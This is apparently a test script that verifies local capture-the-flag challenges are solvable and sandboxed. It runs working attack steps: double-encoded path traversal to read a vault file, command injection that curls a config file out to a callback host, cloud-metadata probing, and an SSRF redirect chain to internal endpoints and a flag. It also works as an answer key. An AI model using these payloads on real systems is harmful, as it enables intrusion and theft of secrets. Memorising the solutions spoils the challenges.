import assert from "node:assert/strict";
const collab = process.env.CTF_COLLAB_TEST_URL || "http://127.0.0.1:8182";
const target = (id) =>
  `http://127.0.0.1:${Number(process.env[`CTF_CH${String(id).padStart(2, "0")}_PORT`] || 3100 + id)}`;
const getJson = async (url, options) => {
  const response = await fetch(url, {
    ...options,
    signal: AbortSignal.timeout(20000),
  });
  return { status: response.status, body: await response.json() };
};
for (const id of [10, 12, 13])
  assert.equal((await getJson(target(id) + "/healthz")).status, 200);
const listing = await getJson(target(10) + "/");
assert.ok(listing.body.availableBackups.length);
const vault = await fetch(
  target(10) + "/api/download?file=..%252Fsecrets%252Frecovery.vault",
);
assert.equal(vault.status, 200);
assert.match(await vault.text(), /VAULT_MASTER_SECRET=ROOT\{/);
const { body: issued } = await getJson(collab + "/collab/token");
const token = issued.token;
const callback = `http://collab:8082/c/${token}`;
async function probe(command) {
  const result = await getJson(target(12) + "/check", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ target: `127.0.0.1; ${command}` }),
  });
  assert.equal(result.status, 200);
}
async function logs() {
  return JSON.stringify((await getJson(collab + `/collab/${token}/log`)).body);
}
await probe(
  `printf 'isolated-request-marker' > /tmp/marker; curl -sS --max-time 1 -X POST --data-binary @/app/data/diagnostics.conf ${callback}`,
);
assert.match(await logs(), /ADMIN_RECOVERY_FLAG=ROOT\{/);
await probe(
  `if test -e /tmp/marker; then printf persisted; else printf clean-new-request; fi | curl -sS --max-time 1 -X POST --data-binary @- ${callback}`,
);
assert.match(await logs(), /clean-new-request/);
assert.doesNotMatch(await logs(), /persisted/);
await probe(
  `if curl -fsS --max-time 1 http://169.254.169.254/latest/meta-data/ > /dev/null; then printf metadata-reachable; else printf metadata-blocked; fi | curl -sS --max-time 1 -X POST --data-binary @- ${callback}`,
);
assert.match(await logs(), /metadata-blocked/);
assert.doesNotMatch(await logs(), /metadata-reachable/);
await probe(
  `if curl -fsS --max-time 1 https://example.com > /dev/null; then printf internet-reachable; else printf internet-blocked; fi | curl -sS --max-time 1 -X POST --data-binary @- ${callback}`,
);
assert.match(await logs(), /internet-blocked/);
assert.doesNotMatch(await logs(), /internet-reachable/);
assert.equal(
  (await getJson(target(13) + "/internal/proc-meta-39")).status,
  403,
  "Direct browser requests must not inherit sandbox loopback privileges",
);
async function preview(path, headers = {}) {
  const internal = `http://127.0.0.1:3013${path}`;
  const redirect = `http://localhost:3013/redirect?target=${encodeURIComponent(internal)}`;
  return getJson(target(13) + "/preview?url=" + encodeURIComponent(redirect), {
    headers,
  });
}
const registry = await preview("/internal/proc-meta-39");
assert.equal(registry.status, 200);
assert.ok(registry.body.preview.registered_services.length);
const dispatched = await preview(
  "/internal/relay-auth-72/dispatch-code?callback_url=" +
    encodeURIComponent(callback),
);
assert.equal(dispatched.status, 200);
const entries = (await getJson(collab + `/collab/${token}/log`)).body;
const serialized = JSON.stringify(entries);
const code = /SEC-\d+\.[a-f0-9]{16}\.[a-f0-9]{64}/.exec(serialized)?.[0];
assert.ok(code, "Out-of-band code arrives at the team callback");
const verified = await preview(
  "/internal/relay-auth-72/verify?code=" + encodeURIComponent(code),
);
assert.equal(verified.status, 200);
const key = verified.body.preview.access_key;
assert.ok(key);
const final = await preview("/internal/core-vault-99", {
  "X-Veyra-Access-Key": key,
});
assert.equal(final.status, 200);
assert.match(final.body.preview.flag, /^ROOT\{/);
const directMetadata = await getJson(
  target(13) +
    "/preview?url=" +
    encodeURIComponent("http://169.254.169.254/latest/meta-data/"),
);
assert.equal(directMetadata.status, 403);
const indirectMetadata = await getJson(
  target(13) +
    "/preview?url=" +
    encodeURIComponent(
      "http://localhost:3013/redirect?target=" +
        encodeURIComponent("http://169.254.169.254/latest/meta-data/"),
    ),
);
assert.equal(indirectMetadata.status, 502);
console.log(
  "PASS: disposable modules 10/12/13 solve paths, fresh filesystems, team callbacks, complete five-stage final, direct-route protection, blocked metadata and denied internet egress.",
);
